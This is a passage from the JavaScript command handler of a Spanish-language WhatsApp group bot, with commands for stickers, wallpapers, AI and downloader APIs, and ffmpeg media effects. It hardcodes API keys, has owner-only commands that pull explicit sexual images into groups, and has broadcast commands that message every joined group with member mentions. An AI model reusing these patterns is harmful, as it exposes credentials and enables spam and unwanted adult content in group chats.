enviar("[🔈] *Cambiando Audio del bot*")
try{
const audix = "" + q + ""
setTimeout(async function () {
renovaraudio(audioS,audix)
 }, 10)   
enviar(respuesta.reiniciar)
 } catch {
 enviar(respuesta.error)
 }
break
case 'pato': 
enviar("[🔈] *Enviando Audio*")
try{
enviarmusica(pato,nombreBott,`Dios te bendiga ${pushname}`,menuS)
 } catch {
 enviar(respuesta.error)
 }
break
case 'kbro': 
enviar("[🔈] *Enviando Audio*")
try{
enviarmusica(kbro,nombreBott,`Dios te bendiga ${pushname}`,menuS)
 } catch {
 enviar(respuesta.error)
 }
break
case 'buendia': case 'buenosdias': case 'dias':
enviar("[🔈] *Enviando Audio*")
try{
enviarmusica(buendia,nombreBott,`Dios te bendiga ${pushname}`,menuS)
 } catch {
 enviar(respuesta.error)
 }
break
case 'cmdbot': case 'editbienvenida':
if(!q) return enviar(respuesta.textito)
if(!isOwner) return enviar(respuesta.dono)
try{
const bienvenix = "" + q + ""
setTimeout(async function () {
renovarbienvenida(bienvenidaS,bienvenix)
 }, 10)   
enviar(respuesta.reiniciar)
 } catch {
 enviar(respuesta.error)
 }
break
case 'editdespedida':
if(!q) return enviar(respuesta.textito)
if(!isOwner) return enviar(respuesta.dono)
try{
const despedix = "" + q + ""
setTimeout(async function () {
renovardespedida(despedidaS,despedix)
 }, 10)   
enviar(respuesta.reiniciar)
 } catch {
 enviar(respuesta.error)
 }
break
case 'editadmin':
if(!q) return enviar(respuesta.textito)
if(!isOwner) return enviar(respuesta.dono)
try{
const despedixx = "" + q + ""
setTimeout(async function () {
renovaradmin(adminS,despedixx)
 }, 10)   
enviar(respuesta.reiniciar)
 } catch {
 enviar(respuesta.error)
 }
break
case 'editnoadmin':
if(!q) return enviar(respuesta.textito)
if(!isOwner) return enviar(respuesta.dono)
try{
const despedixp = "" + q + ""
setTimeout(async function () {
renovarnoadmin(noadminS,despedixp)
 }, 10)   
enviar(respuesta.reiniciar)
 } catch {
 enviar(respuesta.error)
 }
break
case 'chatgpt': case 'chatgp': case 'chatgptt':
if(!q) return enviar(respuesta.textito)
if(!isOwner) return enviar(respuesta.dono)
try{
enviar("⏳️... Buscando Respuesta ... ⏳️")
const iaa = await fetchJson(`https://minijulscitoapi.store/api3/simi?texto=${encodeURIComponent(q)}&apikey=Vipppp`)
let resultai = await translate(iaa.respuesta, { to: "es", autoCorrect: true })
setTimeout(async function () {
enviar(resultai.text)
 }, 30)   
  } catch {
 enviar(respuesta.error)
 }
break
case 'simi': case 'simih':
if(!q) return enviar(respuesta.textito)
if(!isOwner) return enviar(respuesta.dono)
try{
enviar("⏳️... Pensandooo ... ⏳️")
var iaa = await fetchJson(`https://minijulscitoapi.store/api3/chatgp?texto=${encodeURIComponent(q)}&apikey=Vipppp`)
var resultai = await translate(iaa.result, { to: "es", autoCorrect: true })
setTimeout(async function () {
enviar(resultai.text)
 }, 30)   
  } catch {
 enviar(respuesta.error)
 }
break

case 'removebg2': 
if(!q) return enviar(respuesta.linkii)
if(!isOwner) return enviar(respuesta.dono)
try{
enviar(respuesta.espere)
var remoo = await fetchJson(`https://minijulscitoapi.store/api3/removebg?link=${encodeURIComponent(q)}&apikey=Vipppp`)
setTimeout(async function () {
enviarfoto2(remoo.image_data, respuesta.pedido)
 }, 30)   
  } catch {
 enviar(respuesta.error)
 }
break
case 'removebg': case 'quitarfondo':
if(!isOwner) return enviar(respuesta.dono)
if (!isQuotedImage) return enviar(respuesta.fotolink2)  
try{
var encmediass = isQuotedImage ? info.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage: info.message.imageMessage
var raneee = ('./tmp/Db_Juls.'+ await getExtension(encmediass.mimetype))
var imgbuffee = await getFileBuffer(encmediass, 'image')
fs.writeFileSync(raneee, imgbuffee)
var mediass = raneee
var rannn = getRandom('.'+mediass.split('.')[1])
var uploadd44 = await TelegraPh(mediass)
enviar(respuesta.espere)
var remoo = await fetchJson(`https://minijulscitoapi.store/api3/removebg?link=${uploadd44}&apikey=Vipppp`)
setTimeout(async function () {
enviarfoto2(remoo.image_data, respuesta.pedido)
 }, 30)  
 } catch {
 enviar(respuesta.error)
 }
break
case 'attp1': case 'attp2': case 'attp3': case 'attp4': case 'attp5': case 'attp6': case 'attp7': case 'attp8': case 'attp9': case 'attp10': case 'attp11':
if(!q) return enviar(respuesta.textito)
try{
enviar(respuesta.espere)
att = await getBuffer(`https://minijulscitoapi.store/api2/${comando}?texto=${encodeURIComponent(q)}&apikey=Vipppp`)
setTimeout(async function () {
await enviarfiguimg(from, att, info, {
 packname: "[ ❗️] 𝗠𝗜𝗡𝗜 𝗕𝗢𝗧 𝟮.𝟬 [ ❗️] ", author: `${pushname}`})	    
  }, 30)  
} catch {
enviar(respuesta.error)
}
break

case'montañas': case'manga': case'lisa': case'kucing': case'kpop': case'katakata': case'kartun': case'justina': case'jiso': case'jeni': case'gamewallp': case'ciberspace': case'cosplaysagiri': case'cosplayloli': case'cosplay': case'carros': case'women2': case'women': case'chuki': case'blackpink': case'aesthetic2': case'aesthetic': case'yulibocil': case'wallhp2': case'wallhp': case'technology': case'tatasurya': case'satanic': case'ryujin': case'rose': case'pubg': case'programming': case'profil': case'ppcouple': case'pentol': 
if(!isGroup) return enviar(respuesta.grupos)
try{
enviar(respuesta.espere)
var imagenWall = await getBuffer(`https://minijulscitoapi.store/aestetic/${comando}?apikey=Vipppp`)
setTimeout(async function () {
enviarfoto(imagenWall, respuesta.pedido)
 }, 30)  
} catch {
enviar(respuesta.error)
}
break
case'doraemon':case'boruto':case'hinata':case'inori':case'itachi':case'itori':case'madara':case'minato':case'naruto':case'sakura':case'sasuke':case'akira':case'akiyama':case'ana':case'asuna':case'ayuzawa':case'chiho':case'chitoge':case'deidara':case'eba':case'elaina':case'emilia':case'miku':case'mikasa':case'megumin':case'loli':case'kurumi':case'kotori':case'keneki':case'kaori':case'kakasih':case'kagura':case'kaga':case'isuzu':case'hestia':case'hekel':case'gremory':case'erza':case'yumeko':case'yuki':case'yotsuba':case'waifu2':case'tsunade':case'toukachan':case'tejina':case'shota':case'shizuka':case'shinomiya':case'shinka':case'shina':case'sagiri':case'rize': case 'pokemon': case 'onepiece': case 'nezuko': case 'nekonime':                 
if(!isGroup) return enviar(respuesta.grupos)
try{
enviar(respuesta.espere)
var imagenWall = await getBuffer(`https://minijulscitoapi.store/wallpaper/${comando}?apikey=Vipppp`)
setTimeout(async function () {
enviarfoto(imagenWall, respuesta.pedido)
 }, 30)  
} catch {
enviar(respuesta.error)
}
break
case'ahegao': case 'ass': case'bdsm': case'blowjob':
case'chuckold': case'cum': case'ero': case'femdom': case'foot': case'gifs': case'glasses': case'hentai': case'jahy':     case'masturbation': case'neko':case'neko2': case 'orgy': case'panties': case'pussy': case 'tentacles': case'thighs': case'yuri': case'zettay':       
if(!isGroup) return enviar(respuesta.grupos)
if(!isOwner) return enviar(respuesta.dono)
try{
enviar(respuesta.espere)
var imagenWall = await getBuffer(`https://minijulscitoapi.store/danger/${comando}?apikey=Vipppp`)
setTimeout(async function () {
enviarfoto(imagenWall, respuesta.pedido)
 }, 30)  
} catch {
enviar(respuesta.error)
}
break   


case 'statusaudio': case 'upswaudio':
if(!isQuotedAudio) return enviar('[❗️] *Remarque un audio Porfavor*')
if (!isGroupAdmins) return enviar(respuesta.admin)
        if (!isBotGroupAdmins) return enviar(respuesta.botadmin)
var encmediass = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage: info.message.audioMessage
var Julzz = await sock.downloadMediaMessage(encmediass)
  var getGroups = await sock.groupFetchAllParticipating()
        var groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
var Julzzi = groups.map(v => v.id)
for (let i of Julzzi) {
                   await sock.sendMessage(i, {
                     audio: Julzz,
                     mimetype: 'audio/mp4',
                     ptt: true
                     ,mentions: groupMembers.map(a => a.id)
                  }, {
                     backgroundColor: '#FFC0CB'            
                  })               
                  console.log(`[❗️] *Audio Enviado Exitosamente* `)   
}
            break
  case 'statusimage': case 'upswimage': 
if(!isQuotedImage) return enviar('[❗️] *Remarque una imagen Porfavor*')
if(!q) return enviar(respuesta.textito)
if (!isGroupAdmins) return enviar(respuesta.admin)
        if (!isBotGroupAdmins) return enviar(respuesta.botadmin)
var encmediass = isQuotedImage ? info.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage: info.message.imageMessage
var Julzz = await sock.downloadMediaMessage(encmediass)
  var getGroups = await sock.groupFetchAllParticipating()
        var groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
var Julzzi = groups.map(v => v.id)
for (let i of Julzzi) {
                   await sock.sendMessage(i, {
                     image: Julzz
                     ,mentions: groupMembers.map(a => a.id),
                     caption : q ? q : "Juls Modders"
                  })               
                  console.log(`[❗️] *imagen Enviada Exitosamente* `)  
 }
            break
 case 'statusvideo': case 'upswvideo': 
if(!isQuotedVideo) return enviar('[❗️] *Remarque un video Porfavor*')
if(!q) return enviar(respuesta.textito)
if (!isGroupAdmins) return enviar(respuesta.admin)
        if (!isBotGroupAdmins) return enviar(respuesta.botadmin)
var encmediass = isQuotedVideo ? info.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage: info.message.videoMessage
var Julzz = await sock.downloadMediaMessage(encmediass)
  var getGroups = await sock.groupFetchAllParticipating()
        var groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
var Julzzi = groups.map(v => v.id)
for (let i of Julzzi) {
                   await sock.sendMessage(i, {
                     video: Julzz
                     ,mentions: groupMembers.map(a => a.id),
                     caption : q ? q : "Juls Modders"
                  })          
                  console.log(`[❗️] *Video Enviado Exitosamente* `)       
 }
            break
case 'statustext': case 'upswtext': case 'notify': case 'notifi': case 'broadcast': 
if(!q) return enviar(respuesta.textito)
if (!isGroupAdmins) return enviar(respuesta.admin)
        if (!isBotGroupAdmins) return enviar(respuesta.botadmin)
  var getGroups = await sock.groupFetchAllParticipating()
        var groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
var Julzzi = groups.map(v => v.id)
for (let i of Julzzi) {
                   await sock.sendMessage(i, {
                     text: q ? q : "Juls Ofc"
                     ,mentions: groupMembers.map(a => a.id)
                  },{ backgroundColor: '#FFC0CB', font: 3})          
                  console.log(`[❗️] *Texto Enviado Exitosamente* `)       
 }
            break
 case 'toanime2':
 if(!q) return enviar(respuesta.linkii)
 enviar(respuesta.espere)
 try{
  var too = await getBuffer(`https://api.akuari.my.id/ai/cartoon3d?urlimg=${q}`) 
  enviarfoto(too,respuesta.pedido)
  } catch {
  enviar(respuesta.error)
  }
  break                    
  case 'toanime':
  if(!isQuotedImage) return enviar('[❗️] *Remarque una imagen Porfavor*')
  enviar(respuesta.espere)
  try{
  var encmediass = isQuotedImage ? info.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage: info.message.imageMessage
var raneee = ('./tmp/Db_Juls.'+ await getExtension(encmediass.mimetype))
var imgbuffee = await getFileBuffer(encmediass, 'image')
fs.writeFileSync(raneee, imgbuffee)
var mediass = raneee
var rannn = getRandom('.'+mediass.split('.')[1])
var uploadd44 = await TelegraPh(mediass)
  var too = await getBuffer(`https://api.akuari.my.id/ai/cartoon3d?urlimg=${uploadd44}`) 
  enviarfoto(too,respuesta.pedido)
  } catch {
  enviar(respuesta.error)
  }
  break
  case 'dibuja': case 'dalle': case 'creaimagen':
  if(!q) return enviar(respuesta.textito)
  enviar(respuesta.espere)
  try{
var dibuj = await getBuffer(`https://api.akuari.my.id/ai/texttoimage?prompt=${q}`)
enviarfoto(dibuj,respuesta.pedido)
  } catch {
  enviar(respuesta.error)
  }
break
case 'dibujav2': case 'crearimagenv2':
  if(!q) return enviar(respuesta.textito)
  enviar(respuesta.espere)
  try{
var dibuj = await getBuffer(`https://api.akuari.my.id/ai/texttoimage-v3?prompt=${q}`)
enviarfoto(dibuj,respuesta.pedido)
  } catch {
  enviar(respuesta.error)
  }
break
case 'dibujav3': case 'crearimagenv3':
  if(!q) return enviar(respuesta.textito)
  enviar(respuesta.espere)
  try{
var dibuj = await getBuffer(`https://api.akuari.my.id/ai/prodia?prompt=${q}`)
enviarfoto(dibuj,respuesta.pedido)
  } catch {
  enviar(respuesta.error)
  }
break
case 'idotaku': case 'otakuid':
if(!q) return enviar(" *Digite una Id aleatoria de 8 digitos*")
  enviar(respuesta.espere)
  try{
var idd = await getBuffer(`https://api.akuari.my.id/downloader/pixiv?id=${q}&ext=.jpg`)
enviarfoto(idd,respuesta.pedido)
  } catch {
  enviar(respuesta.error)
  }
  break
case 'ytvideo': case 'mp4': 
  if (!q) return enviar(respuesta.textito);
  enviar(respuesta.espere)
  try {
    var texti = args.join(' ');
    var dataxx = await fetchJson(`http://sabapi.tech:8090/api/ytsrc/videos?q=${texti}&apikey=MrRootsFree`);
    if (!dataxx || !dataxx.resultado || dataxx.resultado.length === 0) {
      return enviar("*_no se encontraron resultados de esa música_*");
    }
    const result = dataxx.resultado[0]
    const ytbrt = `
🎬 𝐈𝐍𝐅𝐎 𝐃𝐄𝐋 𝐕𝐈𝐃𝐄𝐎 🎬\n\n
[🍿] 𝚃𝙸𝚃𝚄𝙻𝙾 : ${result.title}\n
[🌍] 𝙳𝚄𝚁𝙰𝙲𝙸𝙾𝙽 : ${result.timestamp}\n
[🔥] 𝙳𝙴𝚂𝙲𝚁𝙸𝙿𝙲𝙸𝙾𝙽 : ${result.description}\n`;
    var videoMessage = {
      video: { url: `http://sabapi.tech:8090/api/dl/ytvideo?url=${result.url}&apikey=MrRootsFree` },
      caption : `${ytbrt}`
    }
    setTimeout(() => {
    sock.sendMessage(from, videoMessage, { quoted: info })
     }, 100)
  } catch (e) {
    console.error("error")
    return enviar(respuesta.error)
  }
  break  
case 'ytaudio': case 'play': case 'mp3': case 'ytplay':
 enviar(respuesta.espere)
  if (!q) return enviar(respuesta.textito);
  try {
    var texti = args.join(' ');
    var dataxx = await fetchJson(`http://sabapi.tech:8090/api/ytsrc/videos?q=${texti}&apikey=MrRootsFree`);
    if (!dataxx || !dataxx.resultado || dataxx.resultado.length === 0) {
      return enviar("*_no se encontraron resultados de esa música_*");
    }
    const result = dataxx.resultado[0]
    const ytbrt = `
🎶 𝐈𝐍𝐅𝐎 𝐃𝐄𝐋 𝐀𝐔𝐃𝐈𝐎 🎶\n\n
[🍿] 𝚃𝙸𝚃𝚄𝙻𝙾 : ${result.title}\n
[🌍] 𝙳𝚄𝚁𝙰𝙲𝙸𝙾𝙽 : ${result.timestamp}\n
[🔥] 𝙳𝙴𝚂𝙲𝚁𝙸𝙿𝙲𝙸𝙾𝙽 : ${result.description}\n`;
    var audioMessage = {
      audio: { url: `http://sabapi.tech:8090/api/dl/ytaudio?url=${result.url}&apikey=MrRootsFree` },
      mimetype: "audio/mpeg"
    }
sock.sendMessage(from, { image: { url: result.image }, caption: ytbrt }, { quoted: info })
    sock.sendMessage(from, audioMessage, { quoted: info })
  } catch (e) {
    console.error("error")
    return enviar(respuesta.error)
  }
  break
case 'ytmp3': case 'linkyt': case 'lkyt': case 'linkytmp3': 
if(!q) return enviar(respuesta.linkii)
var kiko = await fetchJson(`https://minijulscitoapi.store/api3/youtube?link=${q}&apikey=Vipppp`)
console.log(kiko)
break
case 'ytmp4': case 'linkytmp4': case 'lkytmp4':
if(!q) return enviar(respuesta.linkii)
var kikom = await fetchJson(`https://minijulscitoapi.store/api3/youtube2?link=${q}&apikey=Vipppp`)
setTimeout(() => {
sock.sendMessage(from,{ video : kikom.url, quoted : respuesta.pedido},{ quoted : info})
 }, 100)
break
 case 'renombrarsticker': case 'robarsticker': case 'robarstickers': case 'robarfigu': case 'robar':

if (!isQuotedSticker) return enviar('𝚁𝙴𝙼𝙰𝚁𝚀𝚄𝙴 𝚄𝙽 𝚂𝚃𝙸𝙲𝙺𝙴𝚁 𝚂𝙸𝙽 𝙼𝙾𝚅𝙸𝙼𝙸𝙴𝙽𝚃𝙾')  
namaPackssib = q.substring(0, q.indexOf('/') - 0)
authorPackssib = q.substring(q.lastIndexOf('/') + 1)
textoio = body.slice(7)
enviar("[❗️] *Robando Stickers*")
try {

stiker_wmio = await getFileBuffer(info.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage, "image")
await enviarfiguimg(from,stiker_wmio, info, {
 packname: namaPackssib, author: authorPackssib
})
 } catch(e) {
enviar("[❗️] *Si quiere robar stickers en movimiento use robargif*")
}
break
case 'robargif':
if(!isGroup) return enviar(respuesta.grupos)
if (!isQuotedSticker) return enviar(respuesta.gif)  
namaPacksssob = q.substring(0, q.indexOf('/') - 0)
authorPacksssob = q.substring(q.lastIndexOf('/') + 1)
textopb = body.slice(7)
if (isDoubleByte(textopb)) return enviar(respuesta.especial)
enviar("[❗️] *Robando Gif*")
try{
bufffob = await getFileBuffer(info.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage, 'sticker')

const pupii = await addExif(bufffob, `${namaPacksssob}` , `${authorPacksssob}` )
sock.sendMessage(from,{ sticker : pupii},{ quoted : info})
} catch(e) {
console.log(e)
enviar(respuesta.error)
}
break
case 'idgroups': case 'groupsid': {
   if(!isOwner) return enviar("[❗] *Solo mi creador Puede usar este comando*")
let getGroups = await sock.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `[❗️] *LISTA DE GRUPOS*\n*Total de grupos* : ${anu.length} \n`
for (let x of anu) {
let metadata2 = await sock.groupMetadata(x)
teks += `◉ Grupo : ${metadata2.subject}\n◉ ID : ${metadata2.id}\n◉ Participantes : ${metadata2.participants.length}\n────────────────────────\n`
}
enviar(teks)
}
break
case 'doger': case 'patrick': case 'gurastick': case 'lovestick': case 'animestick': case 'manus': case 'mukalu': case 'dino': case 'paimon': case 'rabbit': case 'random': case 'sponjebob2': case 'sponjebob': case 'among': 
enviar(respuesta.espere)
try {
var zoor = await getBuffer(`https://minijulscitoapi.store/stickers/${comando}?apikey=Vipppp`)
await enviarfiguimg(from, zoor, info, {
 packname: `${pushname}`, author: `${author}`
})
} catch {
enviar(respuesta.error)
}
break
case 'limitecaracteres': case 'limiteflood': case 'antilimit':
if(!isGroup) return enviar(respuesta.grupos)
        if (!isGroupAdmins) return enviar(respuesta.admin)
        if (!isBotGroupAdmins) return enviar(respuesta.botadmin)
if (args.length < 1) return enviar(respuesta.correctamente)
if (Number(args[0]) === 1) {
if (isAntiFlood) return enviar(respuesta.activos)
antiflood.push(from)
fs.writeFileSync('./archivos/antis/antiflood.json', JSON.stringify(antiflood))
enviar(respuesta.onactivo)
} else if (Number(args[0]) === 0) {
          if (!isAntiFlood) return enviar(respuesta.desactivos)
          let position = false
Object.keys(antiflood).forEach((i) => {
if (antiflood[i] === from) {
position = i
}
})

if (position !== false) {
antiflood.splice(position, 1)
fs.writeFileSync('./archivos/funciones/antiflood.json', JSON.stringify(antiflood))
}
enviar(respuesta.offactivo)
} else {
enviar(respuesta.correctamente)
}
break
case 'groupid': case 'idgroup':
 if (!isGroupAdmins) return enviar(respuesta.admin)
        if (!isBotGroupAdmins) return enviar(respuesta.botadmin)
try{
enviar( `[❗️] *La Id del grupo es : ${groupId}*`)
 } catch {
 enviar(respuesta.error)
 }
break   
case 'mathquiz': case 'math': 
try{
                if (kuismath.hasOwnProperty(sender.split('@')[0])) return enviar("¡Todavía quedan sesiones sin terminar!")
                let { genMath, modes } = require('./archivos/juegos/math')
                if (!q) return enviar(`*Elija Algun modo: ${Object.keys(modes).join(' | ')}*\n *[❗️] Ejemplo : math medium*\n`)
                let result = await genMath(q.toLowerCase())
                sock.sendText(from, `*¿Cuál es el resultado de: ${result.soal.toLowerCase()}*?\nTiempo: ${(result.waktu / 1000).toFixed(2)} segundos`, info).then(() => {
                    kuismath[sender.split('@')[0]] = result.jawaban
                })
                await sleep(result.waktu)
                if (kuismath.hasOwnProperty(sender.split('@')[0])) {
                    console.log("Respuesta: " + result.jawaban)
                    enviar("El Tiempo ha Terminado\nRespuesta: " + kuismath[sender.split('@')[0]])
                    delete kuismath[sender.split('@')[0]]
                }
             } catch {
 enviar(respuesta.error)
 }
            break
case 'myip': case 'miip': case 'ip':
                if(!isOwner) return enviar("[❗] *Solo mi creador Puede usar este comando*")
                try{
                var http = require('http')
                http.get({
                    'host': 'api.ipify.org',
                    'port': 80,
                    'path': '/'
                }, function(resp) {
                    resp.on('data', function(ip) {
                        enviar("🔎 *My IP Publica es*: " + ip)
                    })
                })            
             } catch {
 enviar(respuesta.error)
 }
        break
case 'fact': case 'datocurioso': 
try{
    	const { data } = await axios.get(`https://nekos.life/api/v2/fact`)
    	var resultai = await translate(data.fact, { to: "es", autoCorrect: true })
        return enviar(resultai.text)      
     } catch {
 enviar(respuesta.error)
 }
    break
case 'attpnv': case 'attp':
if(!q) return enviar(respuesta.textito)
var attñ = await getBuffer(`https://vihangayt.me/maker/text2gif?q=${q}`)
try{
await enviarfiguimg(from, attñ, info, {
 packname: "[ ❗️] 𝗠𝗜𝗡𝗜 𝗕𝗢𝗧 𝟮.𝟬 [ ❗️] ", author: `${pushname}`})	    
 } catch {
 enviar(respuesta.error)
 }
break
case 'ttps':
if(!q) return enviar(respuesta.textito)
var attñp = await getBuffer(`https://vihangayt.me/maker/text2img?q=${q}`)
try{
await enviarfiguimg(from, attñp, info, {
 packname: "[ ❗️] 𝗠𝗜𝗡𝗜 𝗕𝗢𝗧 𝟮.𝟬 [ ❗️] ", author: `${pushname}`})	    
 } catch {
 enviar(respuesta.error)
 }
break
case 'patrick2': case 'animegif': case 'dado': 
var pay = await getBuffer(`https://minijulscitoapi.store/stickers/${comando}?apikey=Vipppp`)
try{
await enviarfiguvid(from, pay, info, {
 packname: "[ ❗️] 𝗠𝗜𝗡𝗜 𝗕𝗢𝗧 𝟮.𝟬 [ ❗️] ", author: `${pushname}`})	    
 } catch {
 enviar(respuesta.error)
 }
 break
case 'spotify':
if(!q) return enviar(respuesta.textito)
var jem = await fetchJson(`https://minijulscitoapi.store/api3/spotify?texto=${encodeURIComponent(q)}&apikey=Vipppp`)
var lono = jem.result.data[Math.floor(Math.random()* jem.result.data.length)]
var urll = lono.url
enviar(`[❗️] *Link de la canción* : ${urll}\n Para descargarlo digite linksp y pege el link de la cancion`)
break
case 'linksp': case 'linkspotify':
var loju = await fetchJson(`https://minijulscitoapi.store/download/spotify2?link=${encodeURIComponent(q)}&apikey=Vipppp`)
console.log(loju)
sock.sendMessage(from, { audio : { url : loju.result.url } ,mimetype: 'audio/mp4',ptt: true},{quoted : info})
break
case 'couple': case 'parejas': {
            let member = groupMembers.map(u => u.id)
            let orang = member[Math.floor(Math.random() * member.length)]
            let jodoh = member[Math.floor(Math.random() * member.length)]
            if(jodoh === orang) return enviar("[❗️] *No hay Parejas en el Grupo*")
sock.sendMessage(from,
{ text: `@${orang.split('@')[0]} y @${jodoh.split('@')[0]}
*[ 📈]Hacen Bonita Pareja*`,
contextInfo:{
mentionedJid:[orang, jodoh],
}},
{ quoted: info})        
            }
            break
case 'define': case 'sinonimo': case 'definir':
if(!q) return enviar(respuesta.textito)
try {
targetfine = await axios.get(`http://api.urbandictionary.com/v0/define?term=${q}`)
if (!targetfine) return enviar("[❗️] *No encontre Resultados*")
var reply = `
* Word:* ${q}
* Definition:* ${targetfine.data.list[0].definition
    .replace(/\[/g, "")
    .replace(/\]/g, "")}
* Example:* ${targetfine.data.list[0].example
    .replace(/\[/g, "")
    .replace(/\]/g, "")}`
        	var resultai = await translate(reply, { to: "es", autoCorrect: true })
        
   sock.sendMessage(from,{text:resultai.text},{quoted:info})
} catch (err) {
    console.log(err)
    return enviar(respuesta.error)
    }
    break
//Audios 
case 'topp':
if ((isMedia && !info.message.imageMessage && !info.message.videoMessage || isQuotedAudio)) {
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -filter:a "atempo=1.6,asetrate=22100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(gem)
if (err) return
hah = fs.readFileSync(ran)
try {
sock.sendMessage(from, {audio: hah, mimetype: 'audio/mp4', ptt:true}, {quoted: info})
fs.unlinkSync(ran)
} catch (err) {
enviar(respuesta.error)
}
})
} else {
enviar("[❌️] 𝐑𝐄𝐌𝐀𝐑𝐐𝐔𝐄 𝐔𝐍 𝐀𝐔𝐃𝐈𝐎 𝐏𝐎𝐑𝐅𝐀𝐕𝐎𝐑")
}
break
case 'adolesc': case 'vozmenino':  
if ((isMedia && !info.message.imageMessage && !info.message.videoMessage || isQuotedAudio)) {
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -filter:a atempo=1.06,asetrate=44100*1.25 ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(gem)
if (err) return 
hah = fs.readFileSync(ran)
try {
sock.sendMessage(from, {audio: hah, mimetype: 'audio/mp4', ptt:true}, {quoted: info})
fs.unlinkSync(ran)
} catch (err) {
enviar(respuesta.error)
}
})
} else {
enviar("[❌️]  𝐑𝐄𝐌𝐀𝐑𝐐𝐔𝐄 𝐔𝐍 𝐀𝐔𝐃𝐈𝐎 𝐏𝐎𝐑𝐅𝐀𝐕𝐎𝐑")
}
break
case 'videorapido': case 'fastvid':   
if ((isMedia && isQuotedVideo) && args.length == 0) {
encmedia = isQuotedVideo ? info.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage : info.message.videoMessage
rane = getRandom('.'+await getExtension(encmedia.mimetype))
buffimg = await getFileBuffer(encmedia, 'video')
fs.writeFileSync(rane, buffimg)
media = rane
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return 
buffer453 = fs.readFileSync(ran)
try {
sock.sendMessage(from, {video: buffer453, mimetype: 'video/mp4'}, {quoted: info })
fs.unlinkSync(ran)
} catch (err) {
enviar(respuesta.error)
}
})	
} else {
enviar("❌️]  𝐑𝐄𝐌𝐀𝐑𝐐𝐔𝐄 𝐔𝐍 𝐕𝐈𝐃𝐄𝐎 𝐏𝐎𝐑𝐅𝐀𝐕𝐎𝐑")
}
break
case 'videolento': case 'slowvid':  
if ((isMedia && isQuotedVideo) && args.length == 0) { 
encmedia = isQuotedVideo ? info.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage : info.message.videoMessage
rane = getRandom('.'+await getExtension(encmedia.mimetype))
buffimg = await getFileBuffer(encmedia, 'video')
fs.writeFileSync(rane, buffimg)
media = rane
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return 
buffer453 = fs.readFileSync(ran)
try {
sock.sendMessage(from, {video: buffer453, mimetype: 'video/mp4'}, {quoted: info })
fs.unlinkSync(ran)
} catch (err) {
enviar(respuesta.error)
}
})
} else {
enviar("❌️]  𝐑𝐄𝐌𝐀𝐑𝐐𝐔𝐄 𝐔𝐍 𝐕𝐈𝐃𝐄𝐎 𝐏𝐎𝐑𝐅𝐀𝐕𝐎𝐑")
}
break
case 'videocontrario': case 'reversevid': 
if ((isMedia && isQuotedVideo) && args.length == 0) {
encmedia = isQuotedVideo ? info.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage : info.message.videoMessage
rane = getRandom('.'+await getExtension(encmedia.mimetype))
buffimg = await getFileBuffer(encmedia, 'video')
fs.writeFileSync(rane, buffimg)
media = rane
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} -vf reverse -af areverse ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return 
buffer453 = fs.readFileSync(ran)
try {
sock.sendMessage(from, {video: buffer453, mimetype: 'video/mp4'}, {quoted: info})
fs.unlinkSync(ran)
} catch (err) {
enviar(respuesta.error)
}
})
} else {
enviar("❌️]  𝐑𝐄𝐌𝐀𝐑𝐐𝐔𝐄 𝐔𝐍 𝐕𝐈𝐃𝐄𝐎 𝐏𝐎𝐑𝐅𝐀𝐕𝐎𝐑")
}
break 
case 'audiolento':  case 'slow': 
if ((isMedia && !info.message.imageMessage && !info.message.videoMessage || isQuotedAudio)) {
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -filter:a "atempo=0.9,asetrate=44100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(gem)
if (err) return 
hah = fs.readFileSync(ran)
try {
sock.sendMessage(from, {audio: hah, mimetype: 'audio/mp4', ptt:true}, {quoted: info})
fs.unlinkSync(ran)
} catch (err) {
enviar(respuesta.error)
}
})
} else {
enviar("❌️]  𝐑𝐄𝐌𝐀𝐑𝐐𝐔𝐄 𝐔𝐍 𝐀𝐔𝐃𝐈𝐎 𝐏𝐎𝐑𝐅𝐀𝐕𝐎𝐑")
}
break
case 'bass': 
if ((isMedia && !info.message.imageMessage && !info.message.videoMessage || isQuotedAudio)) {
